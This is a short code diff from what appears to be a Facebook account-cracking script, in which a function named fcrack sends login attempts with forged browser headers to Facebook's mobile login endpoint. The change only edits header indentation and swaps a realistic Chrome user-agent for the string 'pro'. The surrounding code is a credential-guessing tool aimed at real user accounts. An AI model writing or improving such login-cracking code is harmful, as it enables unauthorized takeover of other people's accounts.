@@ -1469,7 +1469,7 @@ def fcrack(uid,pwx,tl):
 
             'method': 'path',
 
-			'scheme': 'https',
+	    'scheme': 'https',
 			
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7',
             
@@ -1499,7 +1499,7 @@ def fcrack(uid,pwx,tl):
             
             'upgrade-insecure-requests': '1',
             
-            'user-agent': 'Mozilla/5.0 (X11; U; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5625.195 Safari/537.36',
+            'user-agent': 'pro',
             
             'viewport-width': '980',}
             lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
